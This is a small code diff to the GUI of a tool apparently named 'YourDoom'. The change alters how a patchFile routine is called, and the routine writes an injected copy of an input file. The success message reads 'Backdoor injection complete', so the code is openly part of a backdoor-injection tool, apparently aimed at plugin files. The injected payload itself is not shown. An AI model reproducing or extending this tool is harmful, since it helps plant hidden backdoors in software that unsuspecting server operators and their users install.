@@ -106,7 +106,7 @@ public class InjectorGUI{
         //Parse uuids
 
         Injector.SimpleConfig sc = new Injector.SimpleConfig(ChatPrefix, InjectOther, Warnings);
-        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);
+        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, true, true);
 
         if(result2){
             JOptionPane.showMessageDialog(null, "Backdoor injection complete.", "YourDoom", JOptionPane.INFORMATION_MESSAGE);
